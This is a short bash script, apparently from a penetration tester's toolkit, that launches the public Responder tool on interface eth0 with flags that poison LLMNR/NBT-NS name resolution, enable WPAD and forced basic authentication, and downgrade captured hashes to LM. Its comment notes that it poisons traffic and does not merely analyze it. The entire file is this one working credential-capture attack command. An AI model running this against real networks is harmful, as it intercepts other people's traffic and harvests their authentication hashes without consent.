#!/bin/bash
#Author: Gilles Biagomba
#Program: Responder_cmd.sh
#Description: This is to invoke the program responder. Do not this will POISON traffic\n
# 	      This will NOT analyze traffic, to analyze traffic change flags to '-a'.\n
#	      https://github.com/SpiderLabs/Responder \n

responder -I eth0 -wrfbdFP --lm
